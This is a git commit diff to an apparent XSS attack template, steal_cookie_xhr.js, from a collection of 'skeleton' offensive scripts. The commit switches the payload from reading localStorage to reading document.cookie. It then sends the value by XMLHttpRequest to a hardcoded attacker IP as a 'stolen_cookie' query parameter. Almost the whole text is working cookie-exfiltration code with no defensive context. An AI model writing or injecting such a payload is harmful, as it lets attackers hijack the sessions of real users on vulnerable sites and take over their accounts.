3a4d2e6916c53b6a7020e73fa5744b33fb44c9f0
thomas <7k45hr0@gmail.com>
2022-08-16 16:08:54 +1000

    Update steal_cookie_xhr.js

--- Skeleton Scripts/XSS/steal_cookie_xhr.js
+++ Skeleton Scripts/XSS/steal_cookie_xhr.js
@@ -1,11 +1,11 @@
 var attacker_ip = "192.168.119.176";
 var url = "http://"+attacker_ip+"?stolen_cookie=";
 
-//Steal cookie
-query_string = localStorage.getItem("user");
-//query_string = document.cookie
+// steal cookie
+//query_string = localStorage.getItem("user");
+query_string = document.cookie
 
-function make_request(url){
+function make_request(url) {
     xhr = new XMLHttpRequest();
     xhr.open("GET", url + query_string, true);
     xhr.send(null);
